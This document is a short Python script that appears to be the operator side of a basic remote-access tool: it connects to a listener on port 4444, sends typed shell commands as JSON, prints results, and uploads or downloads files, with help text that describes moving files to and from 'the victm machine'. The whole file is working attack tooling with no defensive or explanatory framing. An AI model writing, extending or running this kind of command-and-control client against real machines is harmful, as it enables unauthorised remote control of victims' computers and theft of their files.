import socket
import json
from sys import exit

def data_send(data):
    jsondata = json.dumps(data)
    sock.send(jsondata.encode())


def download_file(file):
    f = open(file, 'wb')
    sock.settimeout(5)
    chunk = sock.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = sock.recv(1024)
        except socket.timeout as e:
            break
    sock.settimeout(None)
    f.close()

def data_recv():
    data = ''
    while True:
        try:
            data = data + sock.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def upload_file(file):
    f = open(file, 'rb')
    sock.send(f.read())

sock = socket.socket()
sock.connect(('127.0.0.1',4444))
while True:
    cmd = input("Shell$")
    data_send(cmd)
    if cmd[:6] == 'upload':
        upload_file(cmd[7:])
    elif cmd[:8] == 'download':
        try:
            download_file(cmd[9:])
        except:
            print("Error to download your file")
    elif cmd[:3] == 'cd ':
        pass
    elif cmd == 'exit':
        exit()
    elif cmd == 'help':
        print('''
              upload:
                use this function for upload some file to the victm machine
              download:
                use this function for download some file from victm machine
              exit:
                use this function for exit the program
              ''')
    else:
        answer = data_recv()
        print(answer)